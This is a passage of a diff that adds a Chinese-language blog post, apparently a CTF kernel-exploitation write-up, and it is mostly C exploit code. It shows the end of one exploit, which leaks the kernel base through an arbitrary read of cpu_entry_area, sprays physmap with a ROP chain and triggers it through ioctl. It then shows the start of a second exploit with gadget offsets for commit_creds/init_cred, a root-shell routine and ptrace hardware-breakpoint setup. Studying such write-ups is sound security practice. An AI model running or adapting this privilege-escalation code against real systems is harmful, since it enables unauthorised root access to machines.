+</span></span><span class="line"><span class="cl">    <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;trigger: bind trigger to other cpu, e.g. cpu-1&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">bind_cpu</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;trigger: modify rcx in cpu-0&#39;s `cpu_entry_area` DB_STACK infinitely&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define CPU_0_cpu_entry_area_DB_STACK_rcx_loc (0xfffffe0000010fd8)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define OOB_SIZE(x) (x / 8)
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>    <span class="nf">arb_read</span><span class="p">(</span><span class="n">vuln_fd</span><span class="p">,</span><span class="n">CPU_0_cpu_entry_area_DB_STACK_rcx_loc</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">Open</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">fname</span><span class="p">,</span> <span class="kt">int</span> <span class="n">mode</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">((</span><span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">fname</span><span class="p">,</span> <span class="n">mode</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// unsigned long pageOffsetBase = 0xffff888000000000;
+</span></span></span><span class="line"><span class="cl"><span class="c1">// void get_pfn(){
+</span></span></span><span class="line"><span class="cl"><span class="c1">//     void *pg;
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 	unsigned long pginfo = 0xcccccccc;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 	pg = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_POPULATE|MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 	if (pg == MAP_FAILED) {
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 		perror(&#34;mmap&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 		exit(-1);
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 	}
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 	int fd = Open(&#34;/proc/self/pagemap&#34;, O_RDWR);
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 	if (lseek(fd, ((off_t)pg &gt;&gt; 12) * sizeof(pginfo), SEEK_SET) &lt; 0) {
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 		perror(&#34;lseek&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 		exit(-1);
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 	}
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 	if (read(fd, &amp;pginfo, sizeof(pginfo)) &lt; 0) {
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 		perror(&#34;read&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 		exit(-1);
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 	}
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">//     unsigned long pfn = pginfo &amp; 0x7fffffffffffff;
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 	unsigned long synonym = (pfn &lt;&lt; 12) + pageOffsetBase;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 	printf(&#34;[*] PFN: %lx\n&#34;, pfn);
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 	printf(&#34;[*] synonym is at: %p\n&#34;, (void *)synonym);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">// }
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">do_init</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">kernel_base</span> <span class="o">=</span> <span class="nf">arb_read</span><span class="p">(</span><span class="n">vuln_fd</span><span class="p">,</span><span class="mh">0xfffffe0000002f50</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">kernel_base</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">-</span> <span class="mh">0x1000b49</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;%llx&#34;</span><span class="p">,</span><span class="n">kernel_base</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">page_size</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">physmap_spray_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">page_size</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">constructROPChain</span><span class="p">(</span><span class="n">physmap_spray_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="n">kernel_base</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">physmap_spray_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*] Spraying physmap...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">physmap_spray_arr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">page_size</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">physmap_spray_arr</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">errExit</span><span class="p">(</span><span class="s">&#34;oom for physmap spray!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">memcpy</span><span class="p">(</span><span class="n">physmap_spray_arr</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">physmap_spray_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">page_size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">hexdump</span><span class="p">(</span><span class="n">physmap_spray_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mh">0x1000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[*] trigger physmap one_gadget...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// get_pfn();
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">try_hit</span> <span class="o">=</span> <span class="mh">0xffff888000000000</span> <span class="o">+</span> <span class="mh">0x200000</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">vuln_fd</span><span class="p">,</span><span class="mh">0x6666</span><span class="p">,</span><span class="n">try_hit</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="尝试思路2">尝试思路2</h3>
+<h5 id="地址leak-1">地址leak</h5>
+<p>思路还是和1一样</p>
+<h5 id="劫持程序流">劫持程序流</h5>
+<p>使用p0文章里面的可以将寄存器放到</p>
+<blockquote>
+<p>您还可以使用这些堆栈在已知的内核虚拟地址伪造攻击者控制的数据。这是可行的，因为当由于这些异常之一而发生从用户态到内核模式的切换时，攻击者任务的通用寄存器内容被直接推送到这个堆栈上。当内核本身生成中断堆栈表异常并交换到异常堆栈时也会发生这种情况</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span><span class="lnt">203
+</span><span class="lnt">204
+</span><span class="lnt">205
+</span><span class="lnt">206
+</span><span class="lnt">207
+</span><span class="lnt">208
+</span><span class="lnt">209
+</span><span class="lnt">210
+</span><span class="lnt">211
+</span><span class="lnt">212
+</span><span class="lnt">213
+</span><span class="lnt">214
+</span><span class="lnt">215
+</span><span class="lnt">216
+</span><span class="lnt">217
+</span><span class="lnt">218
+</span><span class="lnt">219
+</span><span class="lnt">220
+</span><span class="lnt">221
+</span><span class="lnt">222
+</span><span class="lnt">223
+</span><span class="lnt">224
+</span><span class="lnt">225
+</span><span class="lnt">226
+</span><span class="lnt">227
+</span><span class="lnt">228
+</span><span class="lnt">229
+</span><span class="lnt">230
+</span><span class="lnt">231
+</span><span class="lnt">232
+</span><span class="lnt">233
+</span><span class="lnt">234
+</span><span class="lnt">235
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// =-=-=-=-=-=-=-= INCLUDE =-=-=-=-=-=-=-=
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define _GNU_SOURCE
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;assert.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;poll.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sched.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdbool.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/prctl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/ptrace.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/user.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/utsname.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/wait.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;syscall.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;banzi.h&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">// =-=-=-=-=-=-=-= DEFINE =-=-=-=-=-=-=-=
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#define GLOBAL_MMAP_ADDR ((char *)(0x12340000))
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define GLOBAL_MMAP_LENGTH (0x2000)
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="n">buf_buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">GLOBAL_MMAP_ADDR</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_eflags</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">,</span> <span class="n">user_ip</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span>  <span class="n">commit_creds</span> <span class="o">=</span> <span class="mh">0x0bb5b0</span> <span class="o">+</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span>  <span class="n">init_cred</span> <span class="o">=</span> <span class="mh">0x1a4cbf8</span> <span class="o">+</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span>  <span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x002c9d</span> <span class="o">+</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span>  <span class="n">pop_rax_ret</span> <span class="o">=</span> <span class="mh">0x04e368</span> <span class="o">+</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span>  <span class="n">pop_rsp_ret</span> <span class="o">=</span> <span class="mh">0x2af92f</span> <span class="o">+</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span>  <span class="n">swapgs_restore_regs_and_return_to_usermode</span> <span class="o">=</span> <span class="mh">0x1000f01</span><span class="o">+</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span>  <span class="n">add_rsp_0x18_pop_rbx_pop_rbp_ret</span> <span class="o">=</span> <span class="mh">0x18be788</span> <span class="o">+</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span>  <span class="n">ret</span> <span class="o">=</span> <span class="mh">0x00038d</span> <span class="o">+</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">typ_cmd</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">val</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">vuln_fd</span><span class="p">,</span><span class="n">vuln_fd1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">pid_t</span> <span class="n">child</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">pid_t</span> <span class="n">trigger</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">sync_pipe</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">2</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// =-=-=-=-=-=-=-= FUNCTION =-=-=-=-=-=-=-=
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">get_shell</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">uid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">uid</span> <span class="o">=</span> <span class="nf">getuid</span><span class="p">()))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;root get!!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">execl</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="s">&#34;sh&#34;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;gain root failed, uid: %d&#34;</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">saveStatus</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">__asm__</span><span class="p">(</span><span class="s">&#34;mov user_cs, cs;&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;mov user_ss, ss;&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;mov user_sp, rsp;&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;pushf;&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;pop user_rflags;&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\033</span><span class="s">[34m</span><span class="se">\033</span><span class="s">[1m[*] Status has been saved.</span><span class="se">\033</span><span class="s">[0m</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">bind_cpu</span><span class="p">(</span><span class="kt">int</span> <span class="n">cpu_idx</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">cpu_set_t</span> <span class="n">my_set</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">CPU_ZERO</span><span class="p">(</span><span class="o">&amp;</span><span class="n">my_set</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">CPU_SET</span><span class="p">(</span><span class="n">cpu_idx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">my_set</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">sched_setaffinity</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">cpu_set_t</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">my_set</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;sched_setaffinity: %m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#define DR_OFFSET(num) ((void *)(&amp;((struct user *)0)-&gt;u_debugreg[num]))
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">void</span> <span class="nf">create_hbp</span><span class="p">(</span><span class="kt">pid_t</span> <span class="n">pid</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;create_hbp&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Set DR0: HBP address
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nf">ptrace</span><span class="p">(</span><span class="n">PTRACE_POKEUSER</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nf">DR_OFFSET</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">addr</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;create hbp ptrace dr0: %m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
